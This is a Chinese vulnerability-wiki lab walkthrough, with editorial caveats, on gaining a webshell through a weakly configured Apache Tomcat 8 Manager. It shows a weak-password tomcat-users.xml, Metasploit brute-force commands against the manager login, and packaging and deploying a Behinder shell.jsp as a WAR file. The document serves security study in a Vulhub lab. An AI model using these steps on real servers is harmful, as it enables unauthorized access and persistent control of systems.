---
source: "Threekiii/Vulnerability-Wiki"
title: "Apache Tomcat8 弱口令+后台getshell漏洞"
product: "Apache Tomcat Manager"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
prerequisites: "管理员配置弱口令并开放远程Manager、账户具manager-gui/script部署权限；正常安装无用户"
source_status: "unknown"
side_effects: "含落盘脚本或账户创建：会留下持久状态。记录本次生成的路径或账户，测试后清理这些对象并撤销关联令牌；不要删除既有业务对象。"
id: "vw-6d318e58e9b67420ad3d2db4"
entity_id: "ve-6d318e58e9b67420ad3d2db4"
schema_version: "1"
canonical: "Web安全/中间件/Apache Tomcat/Apache-Tomcat8-弱口令+后台getshell漏洞.md"
---

# Apache Tomcat8 弱口令+后台getshell漏洞

<!-- vulwiki-editorial:start -->
## 校订与适用边界

- 适用前提：管理员配置弱口令并开放远程Manager、账户具manager-gui/script部署权限；正常安装无用户
- 证据范围：明确非默认配置，是良好前提披露；WAR部署是授权管理功能，不应作独立Tomcat8代码漏洞。

### 本次正文校订

- 按实际内容修正 1 处代码围栏语言标记，保留其中方法与请求内容。

### 尚未解决的证据缺口

以下限制仍适用于后文历史材料；相关版本、结果或修复结论不能据此视为已验证：

- 影响Tomcat8.0只是实验版本，配置风险跨版本需归类而非漏洞版本范围
- 示例给同用户所有manager/admin权限过宽，应标仅实验，尤其GUI与脚本角色分离原则待官方核对
- 弱口令尝试、部署持久WAR/冰蝎有明确写入风险，缺卸载/恢复访问限制
- shell.jsp内容和工具版本外部依赖缺完整来源，截图未视检
- 缺强口令/最小权限/网络限制的修复章节

### 操作风险与资料使用

- 含落盘脚本或账户创建：会留下持久状态。记录本次生成的路径或账户，测试后清理这些对象并撤销关联令牌；不要删除既有业务对象。

本页为文本校订，未执行代码、PoC 或目标请求；原图仅保留引用，未据此确认复现成功。
<!-- vulwiki-editorial:end -->

## 技术正文与历史材料

## 漏洞描述

Tomcat支持在后台部署war文件，可以直接将webshell部署到web目录下。其中，欲访问后台，需要对应用户有相应权限。

Tomcat7+权限分为：

- manager（后台管理）
  - manager-gui 拥有html页面权限
  - manager-status 拥有查看status的权限
  - manager-script 拥有text接口的权限，和status权限
  - manager-jmx 拥有jmx权限，和status权限
- host-manager（虚拟主机管理）
  - admin-gui 拥有html页面权限
  - admin-script 拥有text接口权限

这些权限的究竟有什么作用，详情阅读 http://tomcat.apache.org/tomcat-8.5-doc/manager-howto.html

在`conf/tomcat-users.xml`文件中配置用户的权限：

```
<?xml version="1.0" encoding="UTF-8"?>
<tomcat-users xmlns="http://tomcat.apache.org/xml"
              xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
              xsi:schemaLocation="http://tomcat.apache.org/xml tomcat-users.xsd"
              version="1.0">

    <role rolename="manager-gui"/>
    <role rolename="manager-script"/>
    <role rolename="manager-jmx"/>
    <role rolename="manager-status"/>
    <role rolename="admin-gui"/>
    <role rolename="admin-script"/>
    <user username="tomcat" password="tomcat" roles="manager-gui,manager-script,manager-jmx,manager-status,admin-gui,admin-script" />
    
</tomcat-users>
```

可见，用户tomcat拥有上述所有权限，密码是`tomcat`。

正常安装的情况下，tomcat8中默认没有任何用户，且manager页面只允许本地IP访问。只有管理员手工修改了这些属性的情况下，才可以进行攻击。

## 漏洞影响

Tomcat版本：8.0

## 环境搭建

Vulhub无需编译，直接启动整个环境：

```shell
docker-compose up -d
```

访问`http://your-ip:8080/`即可访问Apache Tomcat/8.0.43页面。

## 漏洞复现

### metasploit爆破tomcat弱口令

访问`http://your-ip:8080/`，点击Manager App：

![image-20220412133434883](./.resource/Apache-Tomcat8-弱口令+后台getshell漏洞/media/image-20220412133434883.png)


跳转tomcat管理页面`http://your-ip:8080/manager/html`，提示输入用户名和密码：

![image-20220412133846764](./.resource/Apache-Tomcat8-弱口令+后台getshell漏洞/media/image-20220412133846764.png)


在kali中使用metasploit对tomcat用户名和密码进行爆破：

```
┌──(root kali)-[/home/kali]
└─# msfconsole

# 搜索tomcat相关模块
msf6 > search tomcat
...
   23  auxiliary/scanner/http/tomcat_mgr_login	normal     No     Tomcat Application Manager Login Utility
...

# 使用tomcat_mgr_login模块进行爆破
msf6 > use auxiliary/scanner/http/tomcat_mgr_login

# 设置服务地址
msf6 auxiliary(scanner/http/tomcat_mgr_login) >show options
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set RHOSTS <your-ip>
RHOSTS => <your-ip>
msf6 auxiliary(scanner/http/tomcat_mgr_login) > run
```

爆破成功，用户名密码为`tomcat:tomcat`：

![image-20220412135451368](./.resource/Apache-Tomcat8-弱口令+后台getshell漏洞/media/image-20220412135451368.png)


输入弱密码`tomcat:tomcat`，即可访问后台。

### 制作war包并上传

首先制作war包`project.war`：

```
E:\Behinder3\server>jar -cvf project.war shell.jsp
已添加清单
正在添加: shell.jsp(输入 = 612) (输出 = 449)(压缩了 26%)
```

上传war包：

![image-20220412135536050](./.resource/Apache-Tomcat8-弱口令+后台getshell漏洞/media/image-20220412135536050.png)


成功部署：

![image-20220412140450360](./.resource/Apache-Tomcat8-弱口令+后台getshell漏洞/media/image-20220412140450360.png)


冰蝎3成功连接`http://your-ip:8080/project/shell.jsp`：

![image-20220412143831721](./.resource/Apache-Tomcat8-弱口令+后台getshell漏洞/media/image-20220412143831721.png)


---

> 来源：Threekiii/Vulnerability-Wiki（https://github.com/Threekiii/Vulnerability-Wiki）
